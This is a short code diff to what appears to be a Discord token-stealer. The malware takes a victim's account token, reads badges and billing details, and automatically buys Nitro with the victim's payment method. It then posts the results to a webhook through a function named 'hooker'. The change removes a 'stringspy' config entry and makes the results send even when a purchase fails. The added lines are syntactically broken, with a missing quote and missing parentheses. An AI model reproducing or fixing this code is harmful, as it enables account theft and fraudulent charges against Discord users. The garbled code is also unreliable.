@@ -10,7 +10,6 @@ const config = {
     auto_buy_nitro: true,
     ping_on_run: true,
     ping_val: "@here",
-    stringspy: "~~stringspy~~", // Dont mind me, I just exist
     embed_name: "~~branding~~",
     embed_icon: "~~icon~~",
     embed_color: 8363488,
@@ -568,6 +567,9 @@ const nitroBought = async (token) => {
     const badges = getBadges(json.flags);
     const billing = await getBilling(token);
     const code = await buyNitro(token);
+    if code.includes("undefined") {
+        code = Failed to buy Nitro"
+    }
     const content = {
         username: config.embed_name,
         content: code,
@@ -600,8 +602,7 @@ const nitroBought = async (token) => {
         ],
     };
     if (config.ping_on_run) content["content"] = config.ping_val + `\n${code}`;
-    if (!code.includes("undefined")) {
-        hooker(content);
+    hooker(content);
     }
 };
 
